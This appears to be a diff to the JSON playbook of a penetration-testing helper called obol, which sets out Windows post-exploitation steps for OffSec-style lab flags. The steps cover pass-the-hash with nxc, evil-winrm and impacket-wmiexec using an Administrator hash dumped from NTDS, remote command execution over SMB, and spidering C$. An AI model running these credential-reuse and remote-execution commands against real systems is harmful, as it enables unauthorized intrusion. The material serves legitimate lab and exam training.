@@ -111,29 +111,35 @@
       },
       "commands": [
         {
-          "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /r C:\\\\Users %i in (user.txt local.txt proof.txt) do @type \"%i\"'",
-          "note": "No shell needed. With the dumped Administrator hash, find and print the user/proof flag anywhere under C:\\Users remotely over SMB. obol fills the hash from the NTDS dump, no credential swap. The winrm CLIENT_TO_SERVER_SEALING error is an evil-winrm bug; this avoids it."
-        },
-        {
           "tool": "cmd",
-          "note": "IN YOUR SHELL (no credential needed): find and print the user flag with your identity for the screenshot.",
-          "run": "hostname & ipconfig & where /r C:\\Users local.txt user.txt proof.txt 2>nul & type {{flag_path_local}}"
+          "locus": "onhost",
+          "win": true,
+          "note": "ON THE HOST, read the LOCATED user flag with your identity in the same frame (hostname + ipconfig + the flag) for the report screenshot. This unlocks once you have searched (the step below): obol fills the exact path from your locate, so it never hands you a Desktop that is not there. obol records this as the captured local flag.",
+          "run": "hostname; ipconfig; type {{flag_path_local}}"
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "note": "LOCATE FIRST, in your WinRM/PowerShell session. The user flag sits on SOME user's Desktop, not yours once you are admin, so search for it before reading. Paste the path it prints and obol fills the read above. Plain cmd.exe shell instead? dir /s /b C:\\Users\\{{flag_names_windows}}",
+          "run": "Get-ChildItem C:\\Users -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
         },
         {
           "tool": "nxc",
-          "note": "LOCATE OVER SMB (only if you hold a hash/credential and have no shell yet). Spider C$ for the flag files. Runs from Kali, so it only LOCATES; OffSec scores a flag read this way ZERO.",
+          "locus": "remote",
+          "note": "LOCATE OVER SMB (from Kali, if you hold a hash or credential and have no shell yet). Spider C$ for the flag files and records where they are. A remote read scores ZERO on OffSec, so get on the host to capture; for a lab grab the next line prints it outright.",
           "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
         },
         {
-          "tool": "evil-winrm",
-          "note": "GET ON THE HOST interactively (if you hold a hash/credential and have no shell yet). Open a real session on the target — the report proof must be a shell ON the box, not a remote read from Kali.",
-          "run": "evil-winrm -i {{target}} -u {{user}} -H {{nthash}}"
+          "tool": "nxc",
+          "locus": "remote",
+          "note": "LAB QUICK GRAB (not OffSec-legal): with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile. Avoids the evil-winrm sealing bug entirely.",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /r C:\\Users %i in ({{flag_names_windows}}) do @type \"%i\"'"
         },
         {
-          "tool": "cmd",
-          "note": "ON THE HOST, inside that session, capture the LOCAL flag with its identity. Screenshot hostname + ipconfig + the flag together. obol records this as the captured local flag.",
-          "run": "hostname; ipconfig; type {{flag_path_local}}"
+          "tool": "evil-winrm",
+          "locus": "onhost",
+          "note": "GET ON THE HOST interactively (if you hold a hash or credential and have no shell yet) so your flag read counts for the report. If evil-winrm throws CLIENT_TO_SERVER_SEALING the instant it connects on a fresh Kali, that is the rubyntlm 0.6.7 bug (auth already succeeded), not your hash: run `sudo gem install rubyntlm` for 0.6.8 and re-run. The Loadout arsenal applies this fix automatically.",
+          "run": "evil-winrm -i {{target}} -u {{user}} -H {{nthash}}"
         }
       ]
     },
@@ -162,23 +168,28 @@
       "commands": [
         {
           "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt'",
-          "note": "PREFERRED, no shell needed. With the Administrator NT hash you just dumped from NTDS, read the root flag remotely over SMB. obol fills the hash from the dump, so you do not have to switch your active credential. If evil-winrm died with CLIENT_TO_SERVER_SEALING (a known ruby/evil-winrm bug on a fresh Kali), use this: nxc reads the flag without evil-winrm."
-        },
-        {
-          "tool": "impacket-wmiexec",
-          "run": "impacket-wmiexec -hashes ':{{dahash}}' {{dauser}}@{{target}} 'type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt'",
-          "note": "Fallback remote read with the DA hash via impacket wmiexec (semi-interactive is also fine: impacket-wmiexec -hashes :{{dahash}} {{dauser}}@{{target}})."
+          "locus": "remote",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'type {{flag_path_root}}'",
+          "note": "PREFERRED, no shell needed. With the Administrator NT hash you just dumped from NTDS, read the root flag remotely over SMB. obol fills the hash from the dump (no credential swap) and the path from Administrator's Desktop, or from your locate if you searched. If evil-winrm died with CLIENT_TO_SERVER_SEALING (the rubyntlm 0.6.7 bug on a fresh Kali), use this: nxc reads the flag without evil-winrm."
         },
         {
           "tool": "cmd",
-          "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity. Screenshot whoami + hostname + ipconfig + the flag together. obol records this as the captured root flag — the box's final objective.",
+          "locus": "onhost",
+          "win": true,
+          "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report. obol records this as the captured root flag, the box's final objective.",
           "run": "whoami & hostname & ipconfig & type {{flag_path_root}}"
         },
         {
-          "tool": "cmd",
-          "note": "If the path was not located yet, sweep the Administrator Desktop (now readable).",
-          "run": "where /r C:\\Users proof.txt root.txt 2>nul & type C:\\Users\\Administrator\\Desktop\\proof.txt 2>nul"
+          "tool": "impacket-wmiexec",
+          "locus": "remote",
+          "run": "impacket-wmiexec -hashes ':{{dahash}}' {{dauser}}@{{target}} 'type {{flag_path_root}}'",
+          "note": "Fallback remote read with the DA hash via impacket wmiexec (semi-interactive is also fine: impacket-wmiexec -hashes :{{dahash}} {{dauser}}@{{target}})."
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "note": "LOCATE if the proof flag is NOT on Administrator's Desktop (rare). Searches every Desktop for your profile's flag names; paste the path it prints and obol fills the reads above. Plain cmd.exe shell instead? dir /s /b C:\\Users\\{{flag_names_windows}}",
+          "run": "Get-ChildItem C:\\Users -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
         }
       ]
     }
